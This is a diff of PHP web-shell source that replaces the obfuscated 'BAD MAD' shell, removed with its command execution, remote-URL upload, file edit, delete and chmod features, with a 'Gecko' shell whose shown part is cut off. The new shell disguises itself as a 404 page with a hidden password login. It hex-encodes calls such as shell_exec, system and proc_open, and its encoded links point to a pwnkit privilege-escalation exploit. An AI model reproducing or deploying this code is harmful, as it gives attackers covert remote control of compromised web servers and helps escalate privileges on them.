@@ -1,871 +1,1362 @@
-<!DOCTYPE html>
-<html>
-<head>
-	<?php echo "<title>BAD MAD</title>"; ?>
-	<meta name="robots" content="noindex">
-	<link rel="icon" href="" type="image/x-icon">
-</head>
-<body bgcolor="#1f1f1f" text="#ffffff">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-<style>
-	@import url('https://fonts.googleapis.com/css?family=Dosis');
-	@import url('https://fonts.googleapis.com/css?family=Bungee');
-	@import url('https://fonts.googleapis.com/css?family=Russo+One');
-body {
-	font-family: "Dosis", cursive;
-	text-shadow:0px 0px 1px #757575;
-}
-
-body::-webkit-scrollbar {
-  width: 12px;
-}
-
-body::-webkit-scrollbar-track {
-  background: #1f1f1f;
-}
-
-body::-webkit-scrollbar-thumb {
-  background-color: #1f1f1f;
-  border: 3px solid gray;
-}
-
-#content tr:hover {
-	background-color: #636263;
-	text-shadow:0px 0px 10px #fff;
-}
-
-#content .first {
-	background-color: #25383C;
-}
-
-#content .first:hover {
-	background-color: #25383C
-	text-shadow:0px 0px 1px #757575;
-}
-
-table {
-	border: 1px #000000 dotted;
-	table-layout: fixed;
-}
-
-td {
-	word-wrap: break-word;
-}
-
-a {
-	color: #ffffff;
-	text-decoration: none;
-}
-
-a:hover {
-	color: #000000;
-	text-shadow:0px 0px 10px #ffffff;
-}
-
-input,select,textarea {
-	border: 1px #000000 solid;
-	-moz-border-radius: 5px;
-	-webkit-border-radius:5px;
-	border-radius:5px;
-}
-
-.gas {
-	background-color: #1f1f1f;
-	color: #ffffff;
-	cursor: pointer;
-}
-
-select {
-	background-color: transparent;
-	color: #ffffff;
-}
-
-select:after {
-	cursor: pointer;
-}
-
-.linka {
-	background-color: transparent;
-	color: #ffffff;
-}
-
-.up {
-	background-color: transparent;
-	color: #fff;
-}
-
-option {
-	background-color: #1f1f1f;
-}
-
-.btf {
-	background: transparent;
-	border: 1px #fff solid;
-	cursor: pointer;
-}
-
-::-webkit-file-upload-button {
-  background: transparent;
-  color: #fff;
-  border-color: #fff;
-  cursor: pointer;
-}
-</style>
-<center>
 <?php
-echo '<font face="Bungee" size="5">B'.'A'.'D'.' M'.'A'.'D</font></center>
-<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td>';
-set_time_limit(0);
-error_reporting(0);
+session_start();
+date_default_timezone_set("Asia/Jakarta");
 
-$gcw = "ge"."tc"."wd";
-$exp = "ex"."plo"."de";
-$fpt = "fi"."le_p"."ut_co"."nte"."nts";
-$fgt = "f"."ile_g"."et_c"."onten"."ts";
-$sts = "s"."trip"."slash"."es";
-$scd = "sc"."a"."nd"."ir";
-$fxt = "fi"."le_"."exis"."ts";
-$idi = "i"."s_d"."ir";
-$ulk = "un"."li"."nk";
-$ifi = "i"."s_fi"."le";
-$sub = "subs"."tr";
-$spr = "sp"."ri"."ntf";
-$fp = "fil"."epe"."rms";
-$chm = "ch"."m"."od";
-$ocd = "oc"."td"."ec";
-$isw = "i"."s_wr"."itab"."le";
-$idr = "i"."s_d"."ir";
-$ird = "is"."_rea"."da"."ble";
-$isr = "is_"."re"."adab"."le";
-$fsz = "fi"."lesi"."ze";
-$rd = "r"."ou"."nd";
-$igt = "in"."i_g"."et";
-$fnct = "fu"."nc"."tion"."_exi"."sts";
-$rad = "RE"."M"."OTE_AD"."DR";
-$rpt = "re"."al"."pa"."th";
-$bsn = "ba"."se"."na"."me";
-$srl = "st"."r_r"."ep"."la"."ce";
-$sps = "st"."rp"."os";
-$mkd = "m"."kd"."ir";
+// Konfigurasi
+$default_action = "FilesMan";
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
 
-$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];
+// Fungsi untuk tampilan halaman login
+function show_login_page($message = "")
+{
+?>
+   
+<!DOCTYPE html> 
+            <html> 
+                <head>
+                    <title>404 Not Found</title>
+                    <style>
+                        h1 {
+                            display: block;
+                            font-size: 2em;
+                            margin-block-start: 0.67em;
+                            margin-block-end: 0.67em;
+                            margin-inline-start: 0px;
+                            margin-inline-end: 0px;
+                            font-weight: bold;
+                        }
 
-$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
-if (empty($disfunc)) {
-	$disf = "<font color='gold'>NONE</font>";
-} else {
-	$disf = "<font color='red'>".$disfunc."</font>";
+                        p {
+                            display: block;
+                            margin-block-start: 1em;
+                            margin-block-end: 1em;
+                            margin-inline-start: 0px;
+                            margin-inline-end: 0px;
+                        }
+
+                        form div input {
+                            caret-color: transparent;
+                            position:absolute;
+                            bottom: 0;
+                            right: 0;
+                        }
+
+                        input[type="password"] { 
+                            border: none; padding: 2px; 
+                        } 
+
+                        input[type="password"]:focus { 
+                            outline: none; 
+                        } 
+
+                        input[type="submit"] { 
+                            border: none; 
+                            padding: 4px 20px; 
+                            background-color: #2e313d; 
+                            color: #FFF; 
+                        } 
+                    </style>
+                </head> 
+                <body cz-shortcut-listen="true">
+                    <h1>Not Found</h1>
+                    <p>The requested URL was not found on this server.</p>
+                    <form action="" method="post"> 
+                        <div align="center"> 
+                            <input type="password" name="pass" placeholder="" autocomplete="off"/>
+                        </div> 
+                    </form> 
+                </body> 
+            </html>
+<?php
+    exit;
 }
 
+if (!isset($_SESSION['authenticated'])) {
+    $stored_hashed_password = '$2y$10$I15eo7ibg1x5XR9BPyLAo.fjZMRLVdu47cFnCDrrhNi6qMfIaOoF6'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
 
-function cekdir() {
-	if (isset($_GET['loknya'])) {
-		$lokasi = $_GET['loknya'];
-	} else {
-		$lokasi = "ge"."t"."cw"."d";
-		$lokasi = $lokasi();
-	}
-	$b = "i"."s_w"."ri"."tab"."le";
-	if ($b($lokasi)) {
-		return "<font color='green'>Writeable</font>";
-	} else {
-		return "<font color='red'>Writeable</font>";
-	}
-}
-
-function crt() {
-	$a = "is"."_w"."ri"."tab"."le";
-	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) {
-		return "<font color='green'>Writeable</font>";
-	} else {
-		return "<font color='red'>Writeable</font>";
-	}
-}
-
-function xrd($lokena) {
-	$a = "s"."ca"."nd"."ir";
-    $items = $a($lokena);
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') {
-            continue;
-        }
-        $b = "is"."_di"."r";
-        $loknya = $lokena.'/'.$item;
-        if ($b($loknya)) {
-            xrd($loknya);
-        } else {
-        	$c = "u"."nl"."in"."k";
-            $c($loknya);
-        }
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        show_login_page();
     }
-    $d = "rm"."di"."r";
-    $d($lokena);
+}
+?>
+
+<?php
+
+$Array = [
+    '7368656c6c5f65786563',
+    '65786563',
+    '7061737374687275',
+    '73797374656d',
+    '70726f635f6f70656e',
+    '706f70656e',
+    '70636c6f7365',
+    '72657475726e',
+    '73747265616d5f6765745f636f6e74656e7473',
+    '676574637764', // g e t c w d => 9 
+    '6368646972', // c h d i r => 10
+    '7068705f756e616d65', // p h p _ u n a m e => 11
+    '6973736574',
+    '66756e6374696f6e5f657869737473',
+    '5f6d61645f636d64',
+    '245f5345525645525b275345525645525f4e414d45275d',
+    '676c6f62', // g l o b => 16
+    '69735f66696c65', // i s _ f i l e => 17
+    '69735f646972', // i s _ d i r => 18
+    '69735f7772697461626c65', // i s _ w r i t e a b l e => 19
+    '69735f7265616461626c65', // i s _ r e a d b l e => 20
+    '66696c6573697a65', // f i l e _ s i z e => 21
+    '6765745f63757272656e745f75736572', // user => 22
+    '5345525645525f534f465457415245', // Server Software => 23
+    '66696c656d74696d65', // f i l e m t i m e => 24
+    '746f756368', // t o u c h => 25
+    '6d6b646972', // m k d i r => 26
+    '66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 27
+    '66696c655f7075745f636f6e74656e7473', // f i l e p u t => 28
+    '726d646972', // r m d i r => 29
+    '756e6c696e6b', // u n l i n k => 30
+    '66696c65', // f i l e => 31
+    '6d756c7469706172742f666f726d2d64617461', // m u l t i p a r t / f o r m d a t a => 32
+    '444f43554d454e545f524f4f54', // r o o t d o c => 33 
+    '68747470733a2f2f6769746875622e636f6d2f4d61644578706c6f6974732f50726976656c6567652d657363616c6174696f6e2f7261772f6d61696e2f70776e6b6974', // Source maybe? => 34
+    '68747470733a2f2f7777772e6578706c6f69742d64622e636f6d2f646f776e6c6f61642f3430383339' // ex => 35
+];
+$hitung_array = count($Array);
+for ($i = 0; $i < $hitung_array; $i++) {
+    $fungsi[] = unhex($Array[$i]);
 }
 
-function cfn($fl) {
-	$a = "ba"."sena"."me";
-	$b = "pat"."hinf"."o";
-	$c = $b($a($fl), loknyaINFO_EXTENSION);
-	if ($c == "zip") {
-		return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';
-	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
-		return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';
-	} elseif ($c == "txt") {
-		return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';
-	} elseif ($c == "pdf") {
-		return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';
-	} elseif ($c == "html") {
-		return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';
-	}
-	else {
-		return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
-	}
+
+
+if (!empty($_GET['download'])) {
+    $nameNyafile = basename($_GET['download']);
+    $pathFilenya = $fungsi[9]() . "/" . $nameNyafile;
+    if (!empty($nameNyafile) && file_exists($pathFilenya)) {
+
+        // Define Headers
+        header('Cache-control: public');
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . $nameNyafile . '"');
+        header('Content-Transfer-Encoding: binary');
+        readfile($pathFilenya);
+        exit;
+    }
 }
 
-function ipsrv() {
-	$a = "g"."eth"."ost"."byna"."me";
-	$b = "fun"."cti"."on_"."exis"."ts";
-	$c = "S"."ERVE"."R_AD"."DR";
-	$d = "SE"."RV"."ER_N"."AM"."E";
-	if ($b($a)) {
-		return $a($_SERVER[$d]);
-	} else {
-		return $a($_SERVER[$c]);
-	}
-}
 
-function ggr($fl) {
-	$a = "fun"."cti"."on_"."exis"."ts";
-	$b = "po"."si"."x_ge"."tgr"."gid";
-	$c = "fi"."le"."gro"."up";
-	if ($a($b)) {
-		if (!$a($c)) {
-			return "?";
-		}
-		$d = $b($c($fl));
-		if (empty($d)) {
-			$e = $c($fl);
-			if (empty($e)) {
-				return "?";
-			} else {
-				return $e;
-			}
-		} else {
-			return $d['name'];
-		}
-	} elseif ($a($c)) {
-		return $c($fl);
-	} else {
-		return "?";
-	}
-}
+?>
 
-function gor($fl) {
-	$a = "fun"."cti"."on_"."exis"."ts";
-	$b = "po"."s"."ix_"."get"."pwu"."id";
-	$c = "fi"."le"."o"."wn"."er";
-	if ($a($b)) {
-		if (!$a($c)) {
-			return "?";
-		}
-		$d = $b($c($fl));
-		if (empty($d)) {
-			$e = $c($fl);
-			if (empty($e)) {
-				return "?";
-			} else {
-				return $e;
-			}
-		} else {
-			return $d['name'];
-		}
-	} elseif ($a($c)) {
-		return $c($fl);
-	} else {
-		return "?";
-	}
-}
+<!DOCTYPE html>
+<html lang="en">
 
-function fdt($fl) {
-	$a = "da"."te";
-	$b = "fil"."emt"."ime";
-    return $a("F d Y H:i:s", $b($fl));
-}
+<head>
+    <meta charset="UTF-8">
+    <title>Gecko [ <?= $_SERVER['HTTP_HOST']; ?> ]</title>
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+    <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
 
-function dunlut($fl) {
-	$a = "fil"."e_exi"."sts";
-	$b = "ba"."sena"."me";
-	$c = "fi"."les"."ize";
-	$d = "read"."fi"."le";
-	if ($a($fl) && isset($fl)) {
-		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
-		header("Conte'.'nt-Control:public");
-		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
-		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
-		header('Exp'.'ires: 0');
-		header("Ex"."pired:0");
-		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
-		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
-		header('Pra'.'gma: pub'.'lic');
-		header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
-		flush();
-		$d($fl);
-		exit;
-	} else {
-		return "Fi"."le Not F"."ound !";
-	}
-}
+        body {
+            font-family: monospace;
+            background-color: #1A1A1D;
+            color: white;
+        }
 
-function komend($kom, $lk) {
-	$x = "pr"."eg_"."mat"."ch";
-	$xx = "2".">"."&"."1";
-	if (!$x("/".$xx."/i", $kom)) {
-		$kom = $kom." ".$xx;
-	}
-	$a = "fu"."ncti"."on_"."ex"."is"."ts";
-	$b = "p"."ro"."c_op"."en";
-	$c = "htm"."lspe"."cialc"."hars";
-	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
-	if ($a($b)) {
-		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
-		return "<pre>".$c($d($meki[1]))."</pre>";
-	} else {
-		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
-	}
-}
+        a {
+            text-decoration: none;
+            color: white;
+        }
 
-function green($text) {
-	echo "<center><font color='green'>".$text."</center></font>";
-}
+        tr th {
+            text-align: center;
+            font-weight: bold;
+            padding: 10px;
+        }
 
-function red($text) {
-	echo "<center><font color='red'>".$text."</center></font>";
-}
+        tr td:nth-child(3) {
+            text-align: center;
+        }
 
-function oren($text) {
-	return "<center><font color='orange'>".$text."</center></font>";
-}
+        tr td {
+            padding: 10px;
+            font-weight: bold;
+        }
 
-function tuls($nm, $lk) {
-	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
-}
+        thead {
+            background-color: #29292e;
+            color: white;
+        }
 
-echo "Se"."rv"."er"." I"."P : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; Yo"."ur I"."P : <font color=gold>".$_SERVER[$rad]."</font><br>";
-echo "We"."b S"."erv"."er : <font color='gold'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
-$unm = "ph"."p_u"."na"."me";
-echo "Sys"."tem : <font color='gold'>".@$unm()."</font><br>";
-$gcu = "g"."et_"."curr"."ent"."_us"."er";
-$gmu = "g"."et"."my"."ui"."d";
-echo "Us"."er : <font color='gold'>".@$gcu()."&nbsp;</font>( <font color='gold'>".@$gmu()."</font>)<br>";
-$phv = "ph"."pve"."rsi"."on";
-echo "PH"."P V"."er"."sio"."n : <font color='gold'>".@$phv()."</font><br>";
-echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";
-echo "MySQL : ";
-if (@$fnct("my"."sql_co"."nne"."ct")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
-}
-echo " &nbsp;|&nbsp; cURL : ";
-if (@$fnct("cu"."rl"."_in"."it")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
-}
-echo " &nbsp;|&nbsp; WG"."ET : ";
-if (@$fxt("/"."us"."r/b"."in/w"."get")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
-}
-echo " &nbsp;|&nbsp; Pe"."rl : ";
-if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
-}
-echo " &nbsp;|&nbsp; Pyt"."ho"."n : ";
-if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
-}
-echo " &nbsp;|&nbsp; S"."u"."do : ";
-if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
-}
-echo " &nbsp;|&nbsp; Pk"."e"."x"."e"."c : ";
-if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
-}
-echo "<br>Di"."rect"."ory : &nbsp;";
+        ul {
+            list-style: none;
+        }
 
-foreach($_POST as $key => $value){
-	$_POST[$key] = $sts($value);
-}
+        ul li {
+            font-weight: bold;
+        }
 
-if(isset($_GET['loknya'])){
-	$lokasi = $_GET['loknya'];
-	$lokdua = $_GET['loknya'];
-} else {
-	$lokasi = $gcw();
-	$lokdua = $gcw();
-}
+        h1 {
+            font-family: 'Nanum Brush Script', cursive;
 
-$lokasi = $srl('\\','/',$lokasi);
-$lokasis = $exp('/',$lokasi);
-$lokasinya = @$scd($lokasi);
+        }
 
-foreach($lokasis as $id => $lok){
-	if($lok == '' && $id == 0){
-		$a = true;
-		echo '<a href="?loknya=/">/</a>';
-		continue;
-	}
-	if($lok == '') continue;
-	echo '<a href="?loknya=';
-	for($i=0;$i<=$id;$i++){
-	echo "$lokasis[$i]";
-	if($i != $id) echo "/";
-} 
-echo '">'.$lok.'</a>/';
-}
+        tbody tr:nth-child(even) {
+            background: #29292e;
+        }
 
-echo '</td></tr><tr><td><br>';
-if (isset($_POST['upwkwk'])) {
-	if (isset($_POST['berkasnya'])) {
-		if ($_POST['dirnya'] == "2") {
-			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
-		}
-		if (empty($_FILES['berkas']['name'])) {
-			echo "<font color=orange>Fi"."le not Se"."lected !</font><br><br>";
-		} else {
-			$data = @$fpt($lokasi."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tm'.'p_na'.'me']));
-				if ($fxt($lokasi."/".$_FILES['berkas']['name'])) {
-					$fl = $lokasi."/".$_FILES['berkas']['name'];
-					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
-					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
-						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
-						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
-					}
-					echo "<br>";
-				} else {
-					echo "<font color='red'>Fa"."ile"."d to Up"."lo"."ad !</font><br><br>";
-			}
-		}
-	} elseif (isset($_POST['linknya'])) {
-		if (empty($_POST['namalink'])) {
-			echo "<font color=orange>Fi"."lename cannot be empty !</font><br><br>";
-		} elseif (empty($_POST['darilink'])) {
-			echo "<font color=orange>Link cannot be empty !</font><br><br>";
-		} else {
-			if ($_POST['dirnya'] == "2") {
-			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
-			}
-				$data = @$fpt($lokasi."/".$_POST['namalink'], @$fgt($_POST['darilink']));
-				if ($fxt($lokasi."/".$_POST['namalink'])) {
-					$fl = $lokasi."/".$_POST['namalink'];
-					echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
-					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
-						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
-						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
-					}
-					echo "<br>";
-				} else {
-					echo "<font color='red'>Fa"."iled to Up"."lo"."ad !</font><br><br>";
-				}
-		}
-	}
-}
+        .pwd {
+            padding: 5px;
+            background-color: #29292e;
+        }
 
-echo "Uplo"."ad Fi"."le : ";
-echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
-<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
-<input type="radio" value="2" name="dirnya" >document_root [ '.crt().' ]
-<br>
-<input type="hidden" name="upwkwk" value="aplod">
-<input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="Up'.'load" class="up" style="cursor: pointer; border-color: #fff"><br>
-<input type="text" name="darilink" class="up" placeholder="https://cal'.'lme'.'bat'.'os'.'a'.'y.g'.'it'.'hu'.'b.io/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
-</form>';
-echo '<br><form method="post" enctype="application/x-www-form-urlencoded">
-Co'.'mm'.'an'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="'.htmlspecialchars($_POST['komend']).'">
-<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
-</form>';
-echo "</table><br>";
+        form li {
+            margin: 15px;
+            margin-left: -5px;
+        }
 
-echo '<hr><center style="font-family: Russo One">';
-echo tuls("HOME", $_SERVER['SC'.'RIP'.'T_N'.'AME']);
-//echo tuls("HOME");
-echo "<hr></center><br>";
+        form li input[type="file"] {
+            border: 1px solid;
+            padding: 3.5px 4px;
+            background-color: #29292e;
+            color: white;
+            border-radius: 5px;
+        }
 
-if (isset($_GET['lokasie'])) {
-	echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];
-	echo '</tr></td></table><br/>';
-	echo "<pre>".htmlspecialchars($fgt($_GET['lokasie']))."</pre>";
-	author();
-} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
-	if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
-		xrd($_POST['loknya']);
-		if ($fxt($_POST['loknya'])) {
-			red("Fai"."led to del"."ete Dir"."ec"."tory !");
-		} else {
-			green("Del"."ete Dir"."ect"."ory Suc"."cess !");
-		}
-	} elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
-		@$ulk($_POST['loknya']);
-		if ($fxt($_POST['loknya'])) {
-			red("Failed to Delete Fi"."le !");
-		} else {
-			green("De"."le"."te Fi"."le Succ"."ess !");
-		}
-	} else {
-		red("Fi"."le / Dir"."ecto"."ry not Fo"."und !");
-	}
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
-	if (!isset($_POST['cemod'])) {
-		if ($_POST['ty'.'pe'] == "fi"."le") {
-			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
-		} else {
-			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
-		}
-		echo '<form method="post">
-		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
-		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-		<input type="hidden" name="pilih" value="ubahmod">';
-		if ($_POST['ty'.'pe'] == "fi"."le") {
-			echo '<input type="hidden" name="type" value="fi'.'le">';;
-		} else {
-			echo '<input type="hidden" name="type" value="di'.'r">';;
-		}
-		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
-		</form><br>';
-	} else {
-		$cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
-		if ($cm == true) {
-			green("Change Mod Success !");
-			if ($_POST['ty'.'pe'] == "fi"."le") {
-				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
-			} else {
-				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
-			}
-			echo '<form method="post">
-			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
-			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-			<input type="hidden" name="pilih" value="ubahmod">';
-			if ($_POST['ty'.'pe'] == "fi"."le") {
-				echo '<input type="hidden" name="type" value="fi'.'le">';;
-			} else {
-				echo '<input type="hidden" name="type" value="di'.'r">';;
-			}
-			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
-			</form><br>';
-		} else {
-			red("Change Mod Failed !");
-			if ($_POST['ty'.'pe'] == "fi"."le") {
-				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
-			} else {
-				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
-			}
-			echo '<form method="post">
-			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
-			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-			<input type="hidden" name="pilih" value="ubahmod">';
-			if ($_POST['ty'.'pe'] == "fi"."le") {
-				echo '<input type="hidden" name="type" value="fi'.'le">';;
-			} else {
-				echo '<input type="hidden" name="type" value="di'.'r">';;
-			}
-			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
-			</form><br>';
-		}
-	}
-} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
-	if (isset($_POST['gantin'])) {
-		$namabaru = $_GET['loknya']."/".$_POST['newname'];
-		$ceen = "re"."na"."me";
-		if (@$ceen($_POST['loknya'], $namabaru) === true) {
-			green("Change Name Success");
-			if ($_POST['ty'.'pe'] == "fi"."le") {
-				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
-			} else {
-				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
-			}
-			echo '<form method="post">
-			New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($_POST['newname']).'" />
-			<input type="hidden" name="loknya" value="'.$_POST['newname'].'">
-			<input type="hidden" name="pilih" value="ubahnama">';
-			if ($_POST['ty'.'pe'] == "fi"."le") {
-				echo '<input type="hidden" name="type" value="fi'.'le">';;
-			} else {
-				echo '<input type="hidden" name="type" value="di'.'r">';;
-			}
-			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
-			</form><br>';
-		} else {
-			red("Change Name Failed");
-		}
-	} else {
-		if ($_POST['ty'.'pe'] == "fi"."le") {
-			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
-		} else {
-			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
-		}
-		echo '<form method="post">
-		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['loknya'])).'" />
-		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-		<input type="hidden" name="pilih" value="ubahnama">';
-		if ($_POST['ty'.'pe'] == "fi"."le") {
-			echo '<input type="hidden" name="type" value="fi'.'le">';;
-		} else {
-			echo '<input type="hidden" name="type" value="di'.'r">';;
-		}
-		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
-		</form><br>';
-	}
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
-	if (isset($_POST['gasedit'])) {
-		$edit = @$fpt($_POST['loknya'], $_POST['src']);
-		if ($fgt($_POST['loknya']) == $_POST['src']) {
-			green("Ed"."it Fi"."le Suc"."ce"."ss !");
-		} else {
-			red("Ed"."it Fi"."le Fai"."led !");
-		}
-	}
-	echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br><br>";
-	echo '<form method="post">
-	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['loknya'])).'</textarea><br>
-	<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-	<input type="hidden" name="pilih" value="ed'.'it">
-	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
-	</form><br>';
-} elseif (isset($_POST['komends'])) {
-	if (isset($_POST['komend'])) {
-		if (isset($_GET['loknya'])) {
-			$lk = $_GET['loknya'];
-		} else {
-			$lk = $gcw();
-		}
-		$km = 'ko'.'me'.'nd';
-		echo $km($_POST['komend'], $lk);
-		exit();
-	}
-} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
-	if (isset($_POST['tanggale'])) {
-		$stt = "st"."rtot"."ime";
-		$tch = "t"."ou"."ch";
-		$tanggale = $stt($_POST['tanggal']);
-		if (@$tch($_POST['loknya'], $tanggale) === true) {
-			green("Change Da"."te Succ"."ess !");
-			$det = "da"."te";
-			$ftm = "fi"."le"."mti"."me";
-			$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
-			if ($_POST['ty'.'pe'] == "fi"."le") {
-				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
-			} else {
-				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
-			}
-			echo '<form method="post">
-			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
-			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-			<input type="hidden" name="pilih" value="ubahtanggal">';
